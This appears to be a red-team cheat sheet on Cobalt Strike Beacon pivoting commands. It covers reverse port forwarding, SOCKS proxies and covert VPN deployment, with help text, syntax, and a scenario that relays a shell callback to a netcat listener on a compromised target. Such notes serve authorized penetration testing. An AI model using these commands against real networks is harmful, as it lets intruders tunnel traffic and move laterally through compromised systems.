# Cobalt Strike

## 01 - Rportfwd (Reverse Port Forwarding)

### 1.1 - Help Menu

- To bind ports for the server side.

```
beacon> help rportfwd
Use: rportfwd [bind port] [forward host] [forward port]
     rportfwd stop [bind port]

Binds the specified port on the target host. When a connection comes in,
Cobalt Strike will make a connection to the forwarded host/port and use Beacon
to relay traffic between the two connections.
```

- To bind ports for the operator side.

```
beacon> help rportfwd_local
Use: rportfwd_local [bind port] [forward host] [forward port]
     rportfwd_local stop [bind port]

Binds the specified port on the target host. When a connection comes in,
Cobalt Strike will make a connection to the forwarded host/port, via your
Cobalt Strike client, and use Beacon to relay traffic between the two connections.
```

### 1.2 - Usage

#### 1.2.1 - Syntax

```
beacon> rportfwd <bind_port> <forward_host> <forward_port>

beacon> rportfwd stop <bind_port>
```

### 1.3 - Scenarios

#### 1.3.1 - Shell Handler Reverse Callback Session

```
beacon> rportfwd_local add -b 0.0.0.0:5986 -r <compromised_target_IP>:5986

beacon> rportfwd_local 5986 <compromised_target_IP> 5986

$ nc -lnvp 5986
```

## 02 - SOCKS Proxy

### 2.1 - Help Menu

```
beacon> help socks
Use: socks [stop]
     socks [port]
     socks [port] [socks4]
     socks [port] [socks5]
     socks [port] [socks5] [enableNoAuth|disableNoAuth] [user] [password]
     socks [port] [socks5] [enableNoAuth|disableNoAuth] [user] [password] [enableLogging|disableLogging]

Starts a SOCKS4a (default) or SOCKS5 server on the specified port.
This server will relay connections through this Beacon.

SOCKS5 servers can be configured with NoAuth authentication (default),
User/Password authentication, and some additional logging.

SOCKS5 Servers currently do not support GSSAPI authentication,
UDP Association, and IPV6.

Use socks stop to stop the SOCKS servers and terminate existing connections.

Traffic will not relay while Beacon is asleep. Change the sleep time with the
sleep command to reduce latency.
```

### 2.2 - Usage

- Start SOCKS4A Proxy server.

```
beacon> socks <PORT> socks4
```

- Start SOCKS5 Proxy server with or without authentication. You can optionally enable logging when tunneling.

```
beacon> socks <PORT> socks5 <enableNoAuth | disableNoAuth> [username] [password] [enableLogging | disableLogging]
```

Refer to [[Tactics && Techniques && Procedures (TTPs) Phases/Post Exploitation/Shell Is The Beginning/Pivoting and Lateral Movement/Pivoting/Linux/SOCKS Proxy/Proxychains]]

## 03 - Convert VPN Tunnel

Note: You must have elevated privileges on the windows target.

### 3.1 - Help Menu

```
beacon> help covertvpn
Use: covertvpn [interface] [ip address]

Deploy a Covert VPN to the target's system. You must have administrator
privileges for the client to work. 

Setup an [interface] through Cobalt Strike -> VPN Interfaces. The 
[ip address] is the IP address of the target interface you want to deploy
the VPN client to.
```

### 3.2 - Usage

```
beacon> covertvpn phear0 <new_IPv4_address>

user@pentestos:~$ sudo ip address add <new_IPv4_address>/24 dev phear0
```